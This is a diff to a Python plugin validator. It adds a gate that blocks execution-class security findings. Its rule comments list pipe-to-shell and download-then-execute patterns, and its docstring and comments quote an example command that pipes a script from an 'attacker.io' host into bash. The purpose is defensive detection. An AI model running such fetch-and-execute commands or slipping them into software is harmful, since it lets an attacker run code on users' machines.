@@ -2463,6 +2463,150 @@ def _run_skillaudit_native(plugin_root: Path, report: ValidationReport) -> None:
         _set_cpv_self_scan(False)
 
 
+# Execution-class RC rule IDs that are genuinely RCE/exec-shaped but are NOT
+# (yet) registered in cpv_validation_common._SECURITY_GATE_BUCKETS Bucket A.
+# These are the supply-chain pipe-to-shell installers (RC-136..RC-143, RC-26),
+# the obfuscated decode-then-exec proximity rule (RC-70), and the taint
+# source→sink sanitizer-bypass marker (RC-75 — the RC-73/74 siblings already
+# carry Bucket A). The plugin gate's execution-class pass below treats a
+# finding as execution-class iff its rule_id resolves to Bucket A in the
+# canonical map OR appears in this explicit set, so an os.system("curl … |
+# bash") (RC-136 CRITICAL) blocks the plugin gate exactly as it blocks the
+# standalone `security` subcommand. FN-safe — this only ADDS coverage; it
+# mutes nothing and relaxes no gate. (RT4-plugin-gate-weaker-than-security.)
+_EXECCLASS_RCE_RULE_IDS: frozenset[str] = frozenset(
+    {
+        "RC-26",  # curl > file ; sh file (redirect/separator-then-execute)
+        "RC-70",  # obfuscated decode-then-exec within ±3 lines of an exec sink
+        "RC-75",  # taint chain reaches an exec sink past a (bypassed) sanitizer
+        "RC-136",  # curl … | sh/bash/zsh/ksh — pipe-to-shell installer (RCE)
+        "RC-137",  # wget … | sh/bash/zsh/ksh — same RCE class with wget
+        "RC-138",  # curl … | python/node in exec mode (stdin/-c/-e/-m pip)
+        "RC-139",  # wget … | python/node in exec mode
+        "RC-140",  # pip install from a non-PyPI URL/git+/index-url (unsigned)
+        "RC-141",  # npm install from a non-npm-registry source (unsigned)
+        "RC-142",  # curl -o … && chmod/sh/bash/python/node (download-then-exec)
+        "RC-143",  # wget -O … && chmod/sh/bash/python/node (download-then-exec)
+    }
+)
+
+
+def _run_security_execclass_gate(plugin_root: Path, report: ValidationReport) -> None:
+    """Run the in-process EXECUTION-CLASS security pass in plugin mode.
+
+    Closes RT4-plugin-gate-weaker-than-security: the user-facing plugin gate
+    (this script — the host of the Gate-A "Devitalize" banner) previously ran
+    ONLY ``_run_skillaudit_native`` as its security pass and did NOT run the
+    ``validate_security`` RC-rule suite. The asymmetry let a plain
+    ``os.system("curl https://attacker.io/x.sh | bash")`` pass the plugin gate
+    VALID/exit-0 while the SAME input fires CRITICAL via the ``security``
+    subcommand (RC-136). The plugin gate — the weaker of the two — is the one
+    users actually run, so the RCE shipped clean.
+
+    This bridges the gap for the EXECUTION class only. It runs the SAME
+    in-process content scanners ``validate_security`` uses for its RCE/exec
+    findings — ``scan_all_files`` (injection / supply-chain / exfil /
+    sandbox-escape / credential-harvest), ``check_phase2e_extras`` (RC-70
+    obfuscated decode-then-exec, RC-65 cloud-IMDS), and ``check_phase10_taint``
+    (RC-73/74/75 Python taint source→sink) — into a FRESH isolated report, then
+    merges back ONLY the findings whose rule_id is execution-class (Bucket A in
+    the canonical ``_SECURITY_GATE_BUCKETS`` map, or in ``_EXECCLASS_RCE_RULE_IDS``).
+
+    Scope discipline (why this is surgical, not a second full security run):
+      * ZERO external scanners. cc-audit, trufflehog, semgrep, cisco, tirith are
+        the expensive / network-touching scanners. Those run ONLY in the
+        standalone ``security`` subcommand / publish pipeline — NOT here. So
+        there is no double-running of any expensive scanner.
+      * Execution-class FILTER. Although ``scan_all_files`` also runs the
+        secret / user-path / prompt-injection scanners, their findings are
+        Bucket B/C (or unbucketed) and are DROPPED by the merge filter. They
+        never reach the umbrella report, so a clean plugin's verdict is
+        unchanged and no secret/path false-positive can flip a previously-VALID
+        clean plugin. Only genuinely execution-class findings are merged.
+      * NO suppression, NO gate relaxation. This only ADDS detection coverage
+        for the RCE class the plugin gate was blind to. It never mutes a rule,
+        relaxes ``--strict``, or adds an allow-list.
+
+    Self-scan parity: mirrors ``_run_skillaudit_native`` — arms the
+    ``validate_security`` self-scan flag (so CPV scanning ITSELF skips its own
+    SHA-verified pattern-source files) inside a try/finally that ALWAYS
+    disarms, preventing the module-global flag from leaking into a subsequent
+    in-process scan of a different plugin.
+
+    Best-effort import: if ``validate_security`` cannot be imported, this is a
+    silent no-op (the mandatory ``_run_skillaudit_native`` pass still ran). The
+    standalone ``security`` subcommand remains the exhaustive authority.
+    """
+    try:
+        from cpv_validation_common import (  # noqa: PLC0415
+            _SECURITY_GATE_BUCKETS,
+            _extract_rule_id,
+        )
+        from validate_security import (  # noqa: PLC0415
+            _set_cpv_self_scan,
+            check_phase2e_extras,
+            check_phase10_taint,
+            is_cpv_self_scan,
+            scan_all_files,
+        )
+    except ImportError:
+        return
+
+    def _is_execclass(message: str) -> bool:
+        rule_id = _extract_rule_id(message)
+        if rule_id in _EXECCLASS_RCE_RULE_IDS:
+            return True
+        return "A" in _SECURITY_GATE_BUCKETS.get(rule_id, frozenset())
+
+    exec_report = ValidationReport()
+
+    # ARM the self-scan filter for the duration of this pass — without it the
+    # scanners' cpv_self_scan_skip / cpv_self_scan_skip_line calls are no-ops
+    # and CPV scanning ITSELF would surface its own pattern STRINGS (the things
+    # it LOOKS FOR) as execution-class findings. Disarm in finally so the flag
+    # never leaks into a later in-process scan of another plugin.
+    self_scan = is_cpv_self_scan(plugin_root)
+    try:
+        _set_cpv_self_scan(self_scan, plugin_root=plugin_root, notice_report=None)
+        # Checks 3-11 content scan (in-process; no subprocess, no network).
+        # Returns a stats dict we don't need — the findings land in exec_report.
+        scan_all_files(plugin_root, exec_report)
+        # Phase 2e — RC-70 obfuscated decode-then-exec (+ RC-65 cloud IMDS).
+        check_phase2e_extras(plugin_root, exec_report)
+        # Phase 10 — RC-73/74/75 Python taint source→sink.
+        check_phase10_taint(plugin_root, exec_report)
+    except Exception as exc:  # noqa: BLE001
+        # A crashed execution-class pass is indeterminate. Surface it as MAJOR
+        # (blocking) rather than silently swallowing — a hidden crash here would
+        # re-open the very FN-hole this function closes.
+        report.major(
+            f"Execution-class security pass crashed: {type(exc).__name__}: {exc}",
+        )
+        return
+    finally:
+        _set_cpv_self_scan(False)
+
+    # Merge ONLY execution-class findings (Bucket A / RCE set) at the four
+    # blocking levels. WARNING/INFO/PASSED are never execution-class verdict
+    # drivers (they match _classify_security_buckets' own level gate). Dedupe
+    # on the exact (level, message, file, line) tuple so re-running a scanner
+    # the skillaudit-native pass already emitted does not double-count.
+    existing = {(r.level, r.message, r.file, r.line) for r in report.results}
+    for r in exec_report.results:
+        if r.level not in ("CRITICAL", "MAJOR", "MINOR", "NIT"):
+            continue
+        if not _is_execclass(r.message):
+            continue
+        key = (r.level, r.message, r.file, r.line)
+        if key in existing:
+            continue
+        existing.add(key)
+        # Append the ValidationResult object directly (mirrors
+        # _merge_file_scan_result) so category/suggestion survive the merge
+        # losslessly — report.add() positionally would not carry them.
+        report.results.append(r)
+
+
 def validate_telemetry(plugin_root: Path, report: ValidationReport) -> None:
     """Run the OTEL telemetry supply-chain sub-validator.
 
@@ -4197,10 +4341,26 @@ def print_results(report: ValidationReport, verbose: bool = False, strict: bool 
 
     print()
 
-    # If there are any fixable issues, point the user at the fixer agent/skill.
-    from cpv_validation_common import _print_fixer_recommendation
+    # Security-gate banners (Gate A — execution-class / Gate B — leaks+harden).
+    # RT4-plugin-gate-weaker-than-security: the plugin gate now runs an
+    # execution-class security pass, so the Gate-A "Devitalize" banner must be
+    # reachable HERE (the user-facing host of that banner) — not only from the
+    # standalone `security` subcommand. Mirrors print_compact_summary: when a
+    # gate fires, render its banner (it already points at the right WORK agent)
+    # and SKIP the generic fixer block to avoid double-pointing at a fixer.
+    # Purely additive informational text — never mutates a count or the exit
+    # code (the banner explains an already-INVALID verdict, it does not invent
+    # one). No-op when no execution-class / leak finding is present.
+    from cpv_validation_common import (
+        _classify_security_buckets,
+        _print_fixer_recommendation,
+        _print_security_gate_banners,
+    )
 
-    _print_fixer_recommendation(report, None)
+    if _classify_security_buckets(report):
+        _print_security_gate_banners(report, None)
+    else:
+        _print_fixer_recommendation(report, None)
 
 
 def print_json(report: ValidationReport) -> None:
@@ -4217,6 +4377,21 @@ def print_json(report: ValidationReport) -> None:
             "passed": sum(1 for r in report.results if r.level == "PASSED"),
         },
         "results": [{"level": r.level, "message": r.message, "file": r.file, "line": r.line} for r in report.results],
+    }
+    # RT4-plugin-gate-weaker-than-security — additive, machine-observable
+    # security-gate signal mirroring validate_security's --json contract
+    # (#70-A). The human banner ASCII is NEVER printed under --json (stdout must
+    # stay pure JSON); consumers learn which gate fired from this object. Purely
+    # derived from the already-built report — changes no count and no exit code.
+    from cpv_validation_common import _classify_security_buckets
+
+    _gate_buckets = _classify_security_buckets(report)
+    output["security_gates"] = {
+        "A": "A" in _gate_buckets,
+        "B": "B" in _gate_buckets,
+        "C": "C" in _gate_buckets,
+        "devitalize_recommended": "A" in _gate_buckets,
+        "leaks_preventer_recommended": bool(_gate_buckets & {"B", "C"}),
     }
     print(json.dumps(output, indent=2))
 
@@ -6331,6 +6506,17 @@ def main() -> int:
     # in addition to validate_security.py Check 27. Iron rule preserved:
     # missing rule catalog → CRITICAL via cpv_skillaudit_native.report_findings.
     _run_skillaudit_native(plugin_root, report)
+    # RT4-plugin-gate-weaker-than-security — make the user-facing plugin gate at
+    # least as strong as the `security` subcommand for the EXECUTION class.
+    # Without this, a plain os.system("curl … | bash") passed the plugin gate
+    # VALID/exit-0 while firing CRITICAL (RC-136) via `security`. This runs the
+    # in-process RCE/exec scanners (injection, supply-chain, RC-70 obfuscated
+    # decode-then-exec, RC-73/74/75 taint) and merges back ONLY execution-class
+    # findings — no external scanners, no secret/path findings, no suppression.
+    # Serial here (same rationale as skillaudit above): it arms/disarms the
+    # validate_security self-scan module-flag, so it must complete BEFORE the
+    # parallel batch's readers fire.
+    _run_security_execclass_gate(plugin_root, report)
     # Print the repo-lint banner up front so output ordering is stable
     # whether or not the rest of the validators run in parallel. The lint
     # engine itself runs INSIDE the parallel batch below.
@@ -6461,6 +6647,11 @@ def main() -> int:
                 args.verbose,
                 args.strict,
                 plugin_path=args.path,
+                # RT4-plugin-gate-weaker-than-security — render the Gate-A
+                # execution-class banner on the compact-summary stdout too, so
+                # the user sees it without opening the report file. The banner
+                # is purely additive (never changes the verdict/exit code).
+                security_gates=True,
             )
         else:
             print_results(report, args.verbose, args.strict)
